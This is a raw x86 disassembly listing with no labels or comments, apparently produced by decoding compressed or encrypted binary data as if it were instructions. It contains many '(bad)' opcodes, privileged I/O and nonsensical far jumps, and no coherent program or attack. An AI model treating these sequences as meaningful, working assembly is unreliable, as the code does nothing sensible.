  424dda:	xchg   edx,eax
  424ddb:	inc    ebp
  424ddc:	mov    dl,BYTE PTR [edx+0x4a10cbaf]
  424de2:	in     al,dx
  424de3:	rcl    DWORD PTR ds:0x32205305,1
  424de9:	sbb    BYTE PTR [ebp-0xc841848],0x7e
  424df0:	sbb    ecx,DWORD PTR [edi+ebp*4-0x1dc0ac46]
  424df7:	iret   
  424df8:	sbb    al,BYTE PTR [edi]
  424dfa:	(bad)  
  424dfb:	in     al,dx
  424dfc:	or     eax,0xc525c83f
  424e01:	enter  0xdd23,0xa5
  424e05:	jno    0x424d9c
  424e07:	or     edi,DWORD PTR [edi+0x65054010]
  424e0d:	mov    bh,0xed
  424e0f:	pop    DWORD PTR [eax]
	...
  424e71:	add    BYTE PTR [eax],al
  424e73:	add    BYTE PTR ds:0xf361d20c,bh
  424e79:	(bad)  
  424e7a:	mov    edi,0x4bceee5c
  424e7f:	jns    0x424ea8
  424e81:	mov    WORD PTR [ebp+0x189b09a],ss
  424e87:	add    BYTE PTR [ecx+eax*1],al
  424e8a:	add    BYTE PTR [eax],al
  424e8c:	out    0xb2,al
  424e8e:	mov    esp,0xf9d77d9e
  424e93:	aas    
  424e94:	aaa    
  424e95:	push   es
  424e96:	test   DWORD PTR [esi+0x58f242f9],esp
  424e9c:	mov    al,0x69
  424e9e:	xor    eax,esp
  424ea0:	mov    bl,0xb5
  424ea2:	and    BYTE PTR [ecx-0x1abc5251],dl
  424ea8:	das    
  424ea9:	cs daa 
  424eab:	lods   al,BYTE PTR ds:[esi]
  424eac:	inc    esi
  424ead:	(bad)  
  424eae:	push   ss
  424eaf:	and    BYTE PTR [eax+ebx*2+0x41e125de],bh
  424eb6:	dec    esp
  424eb7:	jle    0x424e4e
  424eb9:	or     BYTE PTR [edx+0x73db5d88],0xcc
  424ec0:	inc    edx
  424ec1:	mov    BYTE PTR [bp+di-0x470],al
  424ec6:	cmp    al,BYTE PTR [esi]
  424ec8:	bound  ecx,QWORD PTR [esi-0x2e62206f]
  424ece:	or     ebx,DWORD PTR [eax+0x1fcc82c0]
  424ed4:	sub    BYTE PTR [ebp+0xa76b8b9],al
  424eda:	(bad)
  424edf:	mov    WORD PTR [ebp-0x49a13296],es
  424ee5:	shr    DWORD PTR [eax+0x3f643694],cl
  424eeb:	(bad)  
  424eec:	(bad)  
  424eed:	aas    
  424eee:	push   edx
  424eef:	mov    ah,0x5d
  424ef1:	cmp    DWORD PTR [ebx],esi
  424ef3:	mov    dh,0xe6
  424ef5:	cmp    BYTE PTR [eax],bl
  424ef7:	mov    ecx,0x9b9ff48
  424efc:	sti    
  424efd:	scas   al,BYTE PTR es:[edi]
  424efe:	cmp    BYTE PTR [ecx-0x6],al
  424f01:	loop   0x424e9f
  424f03:	ret    
  424f04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424f05:	cmovns eax,DWORD PTR [ebx+0x78]
  424f09:	jl     0x424ec3
  424f0b:	mov    ds:0x2cdf1c21,eax
  424f10:	out    dx,al
  424f11:	imul   ecx,DWORD PTR [edi-0x6a0d6b72],0xffffffd7
  424f18:	mov    ebp,0xc545a5a1
  424f1d:	inc    edi
  424f1e:	(bad)  
  424f1f:	adc    ch,BYTE PTR [edx+0x30457557]
  424f25:	add    al,0xce
  424f27:	or     BYTE PTR [esi-0x3d],0x81
  424f2b:	sti    
  424f2c:	pop    edi
  424f2d:	aam    0xfb
  424f2f:	and    BYTE PTR [eax],al
  424f31:	fisttp DWORD PTR [edx+0x5e]
  424f34:	push   edx
  424f35:	ficomp WORD PTR [edi-0x705a409d]
  424f3b:	in     al,0x67
  424f3d:	sbb    al,0x92
  424f3f:	repz pop ecx
  424f41:	jo     0x424f4a
  424f43:	outs   dx,DWORD PTR ds:[esi]
  424f44:	add    ch,BYTE PTR [ebx+0x33]
  424f47:	fild   QWORD PTR [eax+0x51]
  424f4a:	inc    ecx
  424f4b:	and    BYTE PTR [edi],bh
  424f4d:	and    esp,DWORD PTR [edi]
  424f4f:	sub    ebx,eax
  424f51:	push   0xffffffcd
  424f53:	fstp   DWORD PTR [edx-0x49]
  424f56:	mov    ds:0x16aa7d0f,eax
  424f5b:	pop    ebx
  424f5c:	sbb    ebp,eax
  424f5e:	inc    ecx
  424f5f:	cmc    
  424f60:	retf   
  424f61:	xor    ecx,edx
  424f63:	mov    edx,DWORD PTR ds:0x4c547672
  424f69:	sbb    ah,BYTE PTR [edx+edi*1+0x55]
  424f6d:	pop    eax
  424f6e:	dec    ecx
  424f6f:	push   cs
  424f70:	fisub  WORD PTR [ebp-0x242115be]
  424f76:	popa   
  424f77:	xlat   BYTE PTR ds:[ebx]
  424f78:	push   ebx
  424f79:	jo     0x424f6b
  424f7b:	ret    0xe085
  424f7e:	sub    ebx,DWORD PTR fs:[edi+0x3b]
  424f82:	fild   DWORD PTR [ecx-0x78e4575f]
  424f88:	ja     0x424fc6
  424f8a:	dec    ebx
  424f8b:	mov    esi,ebx
  424f8d:	sar    DWORD PTR [edx+0xca],1
	...
  424ff3:	add    BYTE PTR [ebx+0x16],cl
  424ff6:	int    0x41
  424ff8:	fstp   st(3)
  424ffa:	iret   
  424ffb:	push   ds
  424ffc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424ffd:	fadd   st(3),st
  424fff:	dec    eax
  425000:	cmp    cl,BYTE PTR [ebp-0x754b5195]
  425006:	add    DWORD PTR [eax],eax
  425008:	add    al,0x1
  42500a:	add    BYTE PTR [eax],al
  42500c:	imul   esi,DWORD PTR ds:0x28b101f0,0x2c
  425013:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425014:	mov    bl,0x32
  425016:	hlt    
  425017:	leave  
  425018:	or     dh,BYTE PTR [edx-0x66]
  42501b:	push   eax
  42501c:	xchg   edi,eax
  42501d:	push   edi
  42501e:	jbe    0x42505b
  425020:	ds cwde 
  425022:	icebp  
  425023:	or     dh,BYTE PTR [esi-0x10]
  425026:	lea    edx,[edx-0x6b230a3b]
  42502c:	adc    DWORD PTR [edx+0x36],edi
  42502f:	popf   
  425030:	cmp    BYTE PTR [esi-0x76],dh
  425033:	cwde   
  425034:	test   al,0x1b
  425036:	sbb    DWORD PTR [eax+0x2834b8a2],ecx
  42503c:	mov    ch,0x88
  42503e:	sbb    bl,BYTE PTR [edi+edx*4]
  425041:	popa   
  425042:	pavgb  mm5,QWORD PTR ds:0x556c619b
  425049:	jno    0x425020
  42504b:	ins    DWORD PTR es:[edi],dx
  42504c:	aaa    
  42504d:	push   esi
  42504e:	neg    DWORD PTR [edx]
  425050:	stc    
  425051:	pop    ebp
  425052:	jmp    0x424fe4
  425054:	outs   dx,BYTE PTR ds:[esi]
  425055:	jnp    0x425047
  425057:	mov    dl,0x83
  425059:	push   0xffffffde
  42505b:	jecxz  0x42503d
  42505d:	cmp    al,0x2e
  42505f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425060:	nop
  425061:	je     0x425018
  425063:	fistp  WORD PTR [esi+0x2dd3ae8]
  425069:	inc    ebp
  42506a:	dec    esi
  42506b:	sti    
  42506c:	aaa    
  42506d:	js     0x425044
  42506f:	mov    eax,0xd7f7fe6a
  425074:	pop    es
  425075:	(bad)  
  425076:	or     eax,0xb6ab3715
  42507b:	ret    
  42507c:	(bad)  [esi+0x4a01854f]
  425082:	pop    edi
  425083:	push   ds
  425084:	in     eax,dx
  425085:	cmp    DWORD PTR [ebp+0x2e],ebx
  425088:	and    al,0xe8
  42508a:	push   ds
  42508b:	in     al,dx
  42508c:	and    BYTE PTR ds:0x4edfb167,0x30
  425093:	imul   eax,DWORD PTR [edi-0xb],0x6d
  425097:	shl    ah,cl
  425099:	int3   
  42509a:	mov    ebx,0xf3f8888
  42509f:	mov    eax,ds:0x5f40450a
  4250a4:	frstor [ecx]
  4250a6:	dec    ebx
  4250a7:	inc    ebp
  4250a8:	pop    esp
  4250a9:	cmp    DWORD PTR [ebp+0x7d83b8f0],ecx
  4250af:	pop    ecx
  4250b0:	out    dx,eax
  4250b1:	ins    DWORD PTR es:[edi],dx
  4250b2:	test   al,0xa8
  4250b4:	cmp    eax,ecx
  4250b6:	repz sbb eax,0xd853ffda
  4250bc:	(bad)  
  4250bd:	das    
  4250be:	ss inc ecx
  4250c0:	xchg   ebp,eax
  4250c1:	cmp    ecx,DWORD PTR [esi+0x3a]
  4250c4:	jmp    0x4250b8
  4250c6:	int    0x6
  4250c8:	and    ah,BYTE PTR [ebx+0x49afc828]
  4250ce:	add    BYTE PTR [ecx],0x11
  4250d1:	adc    BYTE PTR [ebx+0x132d8d4],cl
  4250d7:	xchg   ecx,eax
  4250d8:	psrld  mm3,QWORD PTR [esi+0x6f907efd]
  4250df:	out    0x8,eax
  4250e1:	(bad)  
  4250e2:	icebp  
  4250e3:	mov    esp,0x91c5a53c
  4250e8:	or     al,0x4a
  4250ea:	das    
  4250eb:	mov    eax,0x3d584824
  4250f0:	dec    ecx
  4250f1:	inc    ecx
  4250f2:	dec    ebx
  4250f3:	stos   DWORD PTR es:[edi],eax
  4250f4:	fcomip st,st(2)
  4250f6:	adc    DWORD PTR [ebx-0x4bad07de],edi
  4250fc:	ror    BYTE PTR [esi],cl
  4250fe:	retf   
  4250ff:	mov    DWORD PTR [eax+0x36],ebx
  425102:	lods   al,BYTE PTR ds:[esi]
  425103:	fisubr WORD PTR [edi+0x7f]
  425106:	into   
  425107:	icebp  
  425108:	popf   
  425109:	xchg   edi,eax
  42510a:	inc    esp
  42510b:	pop    edx
  42510c:	subps  xmm6,XMMWORD PTR [esi]
  42510f:	in     eax,dx
	...
  425174:	ficom  WORD PTR [ecx]
  425176:	lahf   
  425177:	and    ebx,edi
  425179:	scas   eax,DWORD PTR es:[edi]
  42517a:	(bad)  
  42517b:	std    
  42517c:	out    dx,al
  42517d:	jmp    0x116b:0xffc292e8
  425184:	mov    eax,0x400018b
  425189:	add    DWORD PTR [eax],eax
  42518b:	add    BYTE PTR [ecx+0x62ad8841],dl
  425191:	hlt    
  425192:	sub    bh,dl
  425194:	ror    DWORD PTR [esi+0x17005fe7],1
  42519a:	ret    
  42519b:	or     BYTE PTR [esi-0xb],bl
  42519e:	shl    DWORD PTR ds:0xa2fea9e2,1
  4251a4:	inc    esi
  4251a5:	sbb    edx,ebp
  4251a7:	mov    dl,0xad
  4251a9:	test   esi,0xbad76bc0
  4251af:	sub    bh,BYTE PTR [edi-0x70]
  4251b2:	and    eax,0x6abedd1a
  4251b7:	push   0x68
  4251b9:	fs inc ecx
  4251bb:	pop    edx
  4251bc:	cmp    DWORD PTR [esi-0x60b2f2bc],ecx
  4251c2:	rol    DWORD PTR [ebx+0x7f],0x75
  4251c6:	mov    bl,0x2c
  4251c8:	push   esi
  4251c9:	add    al,0xa1
  4251cb:	push   ss
  4251cc:	stc    
  4251cd:	jbe    0x42515e
  4251cf:	inc    edi
  4251d0:	test   DWORD PTR [ecx+0x63cf2a3],ecx
  4251d6:	retf   0x92f9
  4251d9:	xchg   ebp,eax
  4251da:	mov    DWORD PTR [edi],ebx
  4251dc:	adc    dl,BYTE PTR [edx+eiz*2-0x69068e53]
  4251e3:	enter  0x353e,0xba
  4251e7:	sbb    al,0x50
  4251e9:	jnp    0x425242
  4251eb:	adc    esp,DWORD PTR [edi+edi*4]
  4251ee:	mov    esi,0x1407ab5f
  4251f3:	jnp    0x425195
  4251f5:	adc    eax,0x36fd9e3b
  4251fa:	hlt    
  4251fb:	mov    ebp,0x67434e01
  425200:	(bad)  
  425202:	inc    eax
  425203:	xchg   ebp,eax
  425204:	imul   ecx,edi,0xffffff98
  425207:	stos   DWORD PTR es:[edi],eax
  425208:	push   es
  425209:	cmp    bl,dl
  42520b:	mov    eax,ds:0x3b04ac82
  425210:	mov    esi,0x2cc28b63
  425215:	mov    al,ds:0x99d31385
  42521a:	hlt    
  42521b:	nop
  42521c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42521d:	dec    esp
  42521e:	jae    0x425249
  425220:	push   esp
  425221:	pop    edx
  425222:	jae    0x4251f9
  425224:	and    eax,0x8004dd2b
  425229:	adc    ah,BYTE PTR [edx+0x33493f0c]
  42522f:	into   
  425230:	lock bound edi,QWORD PTR [edi]
  425233:	add    eax,0xec4e38a4
  425238:	sahf   
  425239:	dec    ebp
  42523a:	iret   
  42523b:	xor    DWORD PTR [eax],eax
  42523d:	inc    ebp
  42523e:	sahf   
  42523f:	inc    edx
  425240:	jp     0x4251f9
  425242:	idiv   BYTE PTR [ecx+0x19]
  425245:	mov    dl,0x28
  425248:	lds    edi,FWORD PTR [ecx+0x36]
  42524b:	adc    BYTE PTR [esp+edi*1],dl
  42524e:	jbe    0x4252a2
  425250:	(bad)  
  425251:	in     al,0x32
  425253:	pop    eax
  425254:	mov    esi,0x4705f1b2
  425259:	inc    edx
  42525a:	jl     0x4252a2
  42525c:	retf   0xbf0b
  42525f:	mov    edi,0x6ee4badb
  425264:	xor    edx,DWORD PTR [edi-0x27c6f1de]
  42526a:	dec    ebp
  42526b:	xor    al,0xd6
  42526d:	or     DWORD PTR [ecx+0x3c],0x93185fdd
  425274:	leave  
  425275:	(bad)  
  425276:	lock add DWORD PTR [edx],edi
  425279:	pop    ebp
  42527a:	retf   0x4169
  42527d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42527e:	push   cs
  42527f:	fcmove st,st(2)
  425281:	cwde   
  425282:	adc    eax,0x4413ae20
  425287:	daa    
  425288:	mov    ss,WORD PTR [edx+0x677b54c9]
  42528e:	push   es
  42528f:	pop    esi
	...
  4252f4:	lods   al,BYTE PTR ds:[esi]
  4252f5:	les    esi,FWORD PTR [ebx-0x32]
  4252f8:	jnp    0x4252f9
  4252fa:	mov    ebp,0x45495ee6
  4252ff:	icebp  
  425300:	nop
  425301:	(bad)  
  425302:	pushf  
  425303:	mov    ?,WORD PTR [esp+ecx*4+0x1040001]
  42530a:	add    BYTE PTR [eax],al
  42530c:	mov    eax,ds:0x60be852d
  425311:	ret    0xdc8f
  425314:	imul   ecx,DWORD PTR [edi-0x445b80e5],0x8
  42531b:	jge    0x425345
  42531d:	pop    ebp
  42531e:	push   cs
  42531f:	test   BYTE PTR [eax-0x5c],cl
  425322:	inc    ecx
  425323:	sbb    esi,DWORD PTR [ebx+0x1a]
  425326:	scas   al,BYTE PTR es:[edi]
  425327:	xchg   ebx,eax
  425328:	out    dx,eax
  425329:	dec    edx
  42532a:	test   DWORD PTR [esi+0x825575b],edi
  425330:	xchg   ebp,eax
  425331:	lods   eax,DWORD PTR ds:[esi]
  425332:	das    
  425333:	into   
  425334:	lods   eax,DWORD PTR ds:[esi]
  425335:	sahf   
  425336:	sar    DWORD PTR [edx+0x15],1
  425339:	out    0x73,eax
  42533b:	repz repz fsubrp st(2),st
  42533f:	retf   0xcd74
  425342:	cmp    bl,BYTE PTR [ebx-0x6d]
  425345:	and    BYTE PTR [edi+0xf67b4f5],al
  42534b:	or     BYTE PTR [ebp-0x10b4c9b0],cl
  425351:	mov    ah,0xc3
  425353:	mov    edi,eax
  425355:	outs   dx,BYTE PTR ds:[esi]
  425356:	or     al,0x92
  425358:	xor    eax,0xff9458ff
  42535d:	mov    eax,0xf7314037
  425362:	dec    esi
  425363:	or     al,0x31
  425365:	or     al,0x3d
  425367:	repnz sbb BYTE PTR [ecx],dl
  42536a:	clc    
  42536b:	iret   
  42536c:	mov    dl,0xe3
  42536e:	add    al,BYTE PTR [edx-0x42cef1b3]
  425374:	sbb    bl,BYTE PTR [ecx-0x5be678a3]
  42537a:	icebp  
  42537b:	sub    BYTE PTR [ebx+0x139a8447],dh
  425381:	push   0xbc515250
  425386:	test   cl,dh
  425388:	push   ebp
  425389:	es or  eax,0x967d391f
  42538f:	and    dh,BYTE PTR [ecx+0x10cd92f8]
  425395:	fs loopne 0x42535a
  425398:	add    BYTE PTR [edx+0x20d47002],dh
  42539e:	mov    cl,0x33
  4253a0:	push   ebp
  4253a1:	mov    ebx,0x792db9e9
  4253a6:	fwait
  4253a7:	dec    esi
  4253a8:	xchg   ecx,eax
  4253a9:	fidivr DWORD PTR [ecx-0x7213c0a2]
  4253af:	sahf   
  4253b0:	icebp  
  4253b1:	push   esi
  4253b2:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  4253b4:	loope  0x425428
  4253b6:	inc    esp
  4253b7:	aad    0xe5
  4253b9:	mov    al,ds:0x342805bb
  4253be:	iret   
  4253bf:	cmp    BYTE PTR [esp+edi*2],ch
  4253c2:	xor    eax,0xdce00474
  4253c7:	push   ebp
  4253c8:	inc    eax
  4253c9:	loopne 0x425422
  4253cb:	mov    dl,0x7f
  4253cd:	and    dh,0xcc
  4253d0:	in     al,dx
  4253d1:	idiv   DWORD PTR ds:0x1a4fc661
  4253d7:	dec    edi
  4253d8:	sub    edx,DWORD PTR [ebp+0x20]
  4253db:	push   0xffffffa3
  4253dd:	and    BYTE PTR [edi-0x2c],0xf6
  4253e1:	fild   WORD PTR ds:0xcb068822
  4253e7:	mov    eax,ds:0xbf741c7a
  4253ec:	call   0x7f02:0xa5065d5e
  4253f3:	jae    0x4253c6
  4253f5:	int3   
  4253f6:	jle    0x42545b
  4253f8:	aas    
  4253f9:	and    al,0xf9
  4253fb:	dec    esp
  4253fc:	push   esi
  4253fd:	adc    dl,BYTE PTR [eax+0x6cfec386]
  425403:	fcomi  st,st(2)
  425405:	inc    eax
  425406:	pop    edi
  425407:	jmp    esp
  425409:	mov    ebx,0xdc4e3411
  42540e:	add    BYTE PTR [eax+eax*1],cl
	...
  425471:	add    BYTE PTR [eax],al
  425473:	add    BYTE PTR [edx+0x9],al
  425476:	les    ebp,FWORD PTR [ecx-0x14901231]
  42547c:	fcomp  DWORD PTR [edx]
  42547f:	add    edi,DWORD PTR [ebx]
  425481:	das    
  425482:	sbb    al,0x49
  425484:	ror    BYTE PTR [ebp+0x1040001],0x0
  42548b:	add    BYTE PTR [ebp+0x1ab3b291],dl
  425491:	dec    esp
  425492:	lock aad 0x95
  425495:	push   esp
  425496:	inc    ebp
  425497:	mov    eax,0xe5aba75d
  42549c:	fcom   DWORD PTR [edx+eiz*4-0x4c]
  4254a0:	sub    BYTE PTR [eax],dl
  4254a2:	mov    ds:0x3d4392f0,eax
  4254a7:	(bad)  
  4254a8:	sti    
  4254a9:	dec    esi
  4254aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4254ab:	xchg   edi,eax
  4254ac:	xchg   DWORD PTR [edx],ebx
  4254ae:	(bad)  
  4254af:	in     al,0xab
  4254b1:	sub    DWORD PTR ds:0x2fe6d970,esp
  4254b7:	retf   0x84e3
  4254ba:	add    cl,BYTE PTR [ebp-0x326ad1e]
  4254c0:	mov    eax,0x31493d0e
  4254c5:	mov    ah,0x40
  4254c7:	mov    BYTE PTR [edi+0x77],cl
  4254ca:	das    
  4254cb:	aad    0x90
  4254cd:	inc    ecx
  4254ce:	jno    0x425508
  4254d0:	fneni(8087 only) 
  4254d2:	enter  0x3719,0x36
  4254d6:	repz mov dl,0xbd
  4254d9:	fidivr WORD PTR [eax-0x46]
  4254dc:	push   esi
  4254dd:	dec    esi
  4254de:	xchg   esp,eax
  4254df:	or     eax,0x53589718
  4254e4:	push   0xffffff9d
  4254e6:	outs   dx,DWORD PTR ds:[esi]
  4254e7:	dec    esi
  4254e8:	xchg   ecx,eax
  4254e9:	add    al,0x5d
  4254eb:	dec    esi
  4254ec:	ins    DWORD PTR es:[edi],dx
  4254ed:	dec    edx
  4254ee:	mov    bl,0x59
  4254f0:	jno    0x4254ed
  4254f2:	inc    esi
  4254f3:	aad    0x86
  4254f5:	call   0x794c:0x996935ba
  4254fc:	xchg   ebx,eax
  4254fd:	in     al,0xff
  4254ff:	pusha  
  425500:	mov    al,ds:0xfc84fac2
  425505:	std    
  425506:	inc    edi
  425507:	pop    ecx
  425508:	test   DWORD PTR [ebx+0x279d74e4],ebx
  42550e:	movnti DWORD PTR [di],esi
  425512:	fsub   DWORD PTR ds:0xd86dcfbb
  425518:	jo     0x42550a
  42551a:	mov    bh,0x50
  42551c:	jo     0x42552c
  42551e:	push   edi
  42551f:	sbb    BYTE PTR [edi-0x467131f1],bh
  425525:	adc    al,0xe0
  425527:	lods   al,BYTE PTR ds:[esi]
  425528:	pushf  
  425529:	xchg   edi,esp
  42552b:	fwait
  42552c:	cmp    eax,0xa7308e0f
  425531:	dec    edi
  425532:	shl    DWORD PTR [ebx],1
  425534:	popf   
  425535:	mov    ecx,0xbee3b97e
  42553a:	dec    ecx
  42553b:	test   DWORD PTR [edx+0x1a9a316c],edi
  425541:	fadd   QWORD PTR ds:0x6493e287
  425547:	mov    cl,0x7a
  425549:	pop    esp
  42554a:	push   0xb308d03f
  42554f:	ja     0x425579
  425551:	movnti DWORD PTR [ebx],edx
  425554:	dec    edx
  425555:	push   ecx
  425556:	loope  0x425587
  425558:	cli    
  425559:	mov    ss,esp
  42555b:	daa    
  42555c:	mov    dh,0x4e
  42555e:	dec    ebp
  42555f:	cmp    al,cl
  425561:	mov    ds:0x12f666c6,eax
  425566:	rcl    BYTE PTR [ecx],1
  425568:	and    DWORD PTR [esi],ebx
  42556a:	ins    DWORD PTR es:[edi],dx
  42556b:	xchg   ebp,eax
  42556c:	hlt    
  42556d:	push   0x88c18a5a
  425572:	jge    0x4255e4
  425574:	hlt    
  425575:	daa    
  425576:	or     BYTE PTR [ecx],ah
  425578:	cmp    eax,0x72feeba1
  42557d:	inc    ebp
  42557e:	mov    eax,ds:0xb69d9f65
  425583:	or     BYTE PTR [ebp-0x2bca3308],ch
  425589:	call   0x757f68c1
  42558e:	adc    BYTE PTR [eax],ah
	...
  4255f4:	(bad)  
  4255f5:	jmp    0xfef4:0xfe6e7a4e
  4255fc:	dec    ebp
  4255fd:	mov    esi,0xfd6df13a
  425602:	jge    0x425593
  425604:	les    ecx,FWORD PTR [esi+0x1040001]
  42560a:	add    BYTE PTR [eax],al
  42560c:	(bad)  
  42560d:	cmp    BYTE PTR [eax+0x70],bl
  425610:	mov    ebx,0x2fe87253
  425615:	not    DWORD PTR [edx]
  425617:	pop    ss
  425618:	aad    0xdc
  42561a:	push   ebp
  42561b:	imul   esi,DWORD PTR [edx-0x66caf87a],0x6ec6ae45
  425625:	xchg   esi,eax
  425626:	lea    edx,[esi-0x30]
  425629:	and    BYTE PTR [edx],dl
  42562b:	mov    BYTE PTR [esi],bl
  42562d:	dec    ebp
  42562e:	fcmovb st,st(6)
  425630:	sub    eax,0xc80e9c49
  425635:	retf   0x3ab5
  425638:	repz das 
  42563a:	out    0xf6,eax
  42563c:	and    DWORD PTR [edi-0x5c],ebp
  42563f:	mov    ebx,DWORD PTR [edi]
  425641:	mov    edi,0x9f8f1141
  425646:	(bad)  
  425647:	int3   
  425648:	scas   eax,DWORD PTR es:[edi]
  425649:	dec    BYTE PTR [ecx]
  42564b:	pop    esi
  42564c:	sar    BYTE PTR [esi-0x5b],cl
  42564f:	shl    BYTE PTR [ebp-0x49],cl
  425652:	test   eax,0xe0d010ea
  425657:	loop   0x425637
  425659:	mov    ecx,0x9d5ead2b
  42565e:	pop    ss
  42565f:	inc    edi
  425660:	cli    
  425661:	lods   al,BYTE PTR ds:[esi]
  425662:	or     BYTE PTR [eax-0x14],0x22
  425666:	sbb    edi,esp
  425668:	gs jle 0x425618
  42566b:	ja     0x4256a5
  42566d:	sbb    dh,bl
  42566f:	ja     0x425613
  425671:	call   0xf735:0x4eeacb71
  425678:	xor    DWORD PTR [edi-0x29],ebx
  42567b:	jl     0x425618
  42567d:	aaa    
  42567e:	or     edi,DWORD PTR [esi+0x5d]
  425681:	stos   DWORD PTR es:[edi],eax
  425682:	aam    0x70
  425684:	sbb    DWORD PTR [ecx],ecx
  425686:	pop    esp
  425687:	jmp    0x1462:0x22a57c30
  42568e:	fidiv  DWORD PTR [edx]
  425690:	mov    bh,BYTE PTR [edi-0x7431b583]
  425696:	ror    DWORD PTR [ebx+0x791f0ce5],0x5e
  42569d:	or     ch,BYTE PTR [edx]
  42569f:	jmp    0x4508:0x5495e80f
  4256a6:	into   
  4256a7:	push   esp
  4256a8:	adc    ah,BYTE PTR [eax+ecx*4+0x1]
  4256ac:	iret   
  4256ad:	push   ecx
  4256ae:	xchg   BYTE PTR [edi+0x6b],ah
  4256b1:	dec    ebp
  4256b2:	pop    edi
  4256b3:	xchg   edx,eax
  4256b4:	xor    dl,ch
  4256b6:	(bad)  
  4256b7:	fcmove st,st(5)
  4256b9:	dec    esi
  4256ba:	sbb    al,0x2f
  4256bc:	jmp    0x14ca:0xab65ca59
  4256c3:	out    dx,eax
  4256c4:	xor    DWORD PTR [edx-0x32],esp
  4256c7:	fs jbe 0x425671
  4256ca:	mov    ebx,0x7a6581aa
  4256cf:	mov    bl,BYTE PTR [ebp-0x17c1c6f0]
  4256d5:	inc    edx
  4256d7:	pop    esi
  4256d8:	sti    
  4256d9:	mov    eax,0x2b8e59f3
  4256de:	fcmove st,st(2)
  4256e0:	fidiv  WORD PTR [ebp+0x72f14e73]
  4256e6:	pushf  
  4256e7:	fistp  QWORD PTR ss:[esi+0x33528904]
  4256ee:	test   BYTE PTR [ecx],ch
  4256f0:	js     0x425745
  4256f2:	sub    DWORD PTR [ebx],esi
  4256f4:	jno    0x425700
  4256f6:	leave  
  4256f7:	pop    ebp
  4256f8:	mov    eax,0x9ff3d3b9
  4256fd:	mov    ds:0x38aef0a2,al
  425702:	adc    ebx,DWORD PTR ds:0xd72f4c2c
  425708:	xchg   edx,eax
  425709:	into   
  42570a:	xor    DWORD PTR [esp+esi*2+0xc85f65],ebx
	...
  425771:	add    BYTE PTR [eax],al
  425773:	add    dh,dl
  425775:	aaa    
  425776:	shl    BYTE PTR [ebx+esi*8],cl
  425779:	cmc    
  42577a:	div    bh
  42577c:	test   DWORD PTR [edi+0x3f],0xc5a73d74
  425783:	mov    dh,0xc8
  425785:	pop    DWORD PTR [ecx]
  425787:	add    BYTE PTR [ecx+eax*1],al
  42578a:	add    BYTE PTR [eax],al
  42578c:	mov    eax,ds:0x356fb958
  425791:	pop    edi
  425792:	out    dx,eax
  425793:	mov    bh,0x86
  425795:	int    0x50
  425797:	push   es
  425798:	jbe    0x4257e4
  42579a:	aas    
  42579b:	adc    BYTE PTR [edx+0x399b7464],dh
  4257a1:	add    eax,0xba3b2acc
  4257a6:	sub    al,BYTE PTR [eax+0x11]
  4257a9:	fidivr DWORD PTR [esi+ebx*1]
  4257ac:	xlat   BYTE PTR ds:[ebx]
  4257ad:	loop   0x42575c
  4257af:	mov    ds:0xb41a85f4,al
  4257b4:	push   0xfffffffb
  4257b6:	sar    BYTE PTR [ecx+0x527e22b4],1
  4257bc:	test   dh,0x5b
  4257bf:	dec    eax
  4257c0:	xor    DWORD PTR [ecx],0x92cb0746
  4257c6:	shl    BYTE PTR [ebx],1
  4257c8:	xchg   esi,eax
  4257c9:	mov    bh,0xfb
  4257cb:	clc    
  4257cc:	adc    BYTE PTR [esi+0x74],dh
  4257cf:	je     0x3a4510b2
  4257d5:	or     eax,0x3d6bd850
  4257da:	clc    
  4257db:	fdiv   DWORD PTR [ebp+0x79b3abfd]
  4257e1:	dec    edx
  4257e2:	loopne 0x42580b
  4257e4:	add    BYTE PTR [ebx+0x34716d7d],bh
  4257ea:	ds fs rep stos BYTE PTR es:[edi],al
  4257ee:	les    edx,FWORD PTR [edx+0x34]
  4257f1:	retf   
  4257f2:	push   eax
  4257f3:	mov    esp,0xc03fdafc
  4257f8:	scas   al,BYTE PTR es:[edi]
  4257f9:	inc    esp
  4257fa:	jp     0x425875
  4257fc:	dec    esp
  4257fd:	out    0x93,al
  4257ff:	push   cs
  425800:	jbe    0x4257ce
  425802:	stos   BYTE PTR es:[edi],al
  425803:	data16 jne 0x42583d
  425806:	push   ebp
  425807:	xlat   BYTE PTR ds:[ebx]
  425808:	lahf   
  425809:	cs scas al,BYTE PTR es:[edi]
  42580b:	cmp    al,0x93
  42580d:	cmp    esp,DWORD PTR [ebp-0x6811c214]
  425813:	in     al,0xdf
  425815:	test   DWORD PTR [esi+edx*1-0x31320761],0x72243983
  425820:	aam    0x85
  425822:	scas   al,BYTE PTR es:[edi]
  425823:	xor    al,0x8f
  425825:	adc    al,bh
  425827:	dec    eax
  425828:	ror    DWORD PTR [edx],1
  42582a:	popa   
  42582b:	dec    eax
  42582c:	fcom   QWORD PTR [edx]
  42582e:	push   ss
  42582f:	cmc    
  425830:	retf   0x3611
  425833:	rcr    DWORD PTR [ebp+0x504e85c3],cl
  425839:	cs mov ch,0x14
  42583c:	cmc    
  42583d:	arpl   cx,sp
  42583f:	cwde   
  425840:	rcr    DWORD PTR [ecx-0x18d7d251],0x45
  425847:	xor    BYTE PTR ds:0x18db315e,0x80
  42584e:	test   eax,0xc027f193
  425853:	mov    gs,WORD PTR [edx+0x39]
  425856:	inc    ebx
  425857:	shl    esi,1
  425859:	push   edx
  42585a:	call   0x4aaaedf6
  42585f:	xor    BYTE PTR [eax],cl
  425861:	das    
  425862:	nop
  425863:	fs jge 0x4258ac
  425866:	xor    eax,0xfa131fab
  42586b:	dec    ebp
  42586c:	sbb    DWORD PTR [edi],ebp
  42586e:	stc    
  42586f:	fdiv   st,st(3)
  425871:	dec    ecx
  425872:	in     eax,0x34
  425874:	loope  0x4258ab
  425876:	pop    es
  425877:	repnz mov eax,0xd888c301
  42587d:	(bad)
  425882:	rol    BYTE PTR [eax+eiz*1+0x19],0x37
  425887:	sbb    al,0x5
  425889:	aaa    
  42588a:	jmp    0x3514bd66
  42588f:	add    DWORD PTR [eax],0x0
	...
  4258f1:	add    BYTE PTR [eax],al
  4258f3:	add    BYTE PTR [edx+edx*2-0x70],bl
  4258f7:	push   edx
